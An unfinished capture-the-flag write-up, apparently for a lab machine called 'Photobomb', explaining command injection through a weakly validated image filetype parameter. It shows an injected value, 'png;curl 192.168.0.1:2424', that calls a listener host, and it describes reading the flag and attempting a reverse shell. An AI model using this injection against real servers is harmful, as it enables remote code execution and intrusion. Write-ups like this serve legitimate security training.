# Photobomb

## User
As it turns out, the regex checking of the filetype header was the actual vulnerbility. Although contrary to my ideas, you are not able to retrieve an forbidden file with this technique, but execute code on the server.

This is possibe because not every image file is stored seperately on the server, but some software like imagemagic is used to convert it to the wanted dimensions and filetype.

So the command looks something like this:

```bash
image-software -name ... -dimensions ... -filetype png
```

And the regex checks only if the filetype starts with png or jpg, allowing me to insert another command with an semicolon at the end **png;curl 192.168.0.1:2424**

I used curl to check if the command is actually getting executed, by starting a python server and listening for incoming connections.

The last thing I needed to do, was to execute a reverse tcp on the server, but before that I used **cat** in the same way as curl in the example below to read out the **user.txt** file that was in the home directory to get the flag.

*The thing that needed to be considered is that everything needed to be URL encoded.*

At this point I had a problem with the reverse shell, that was properly URL encoded, but still didn't work. This required some more testing.

## Root
Work in progress
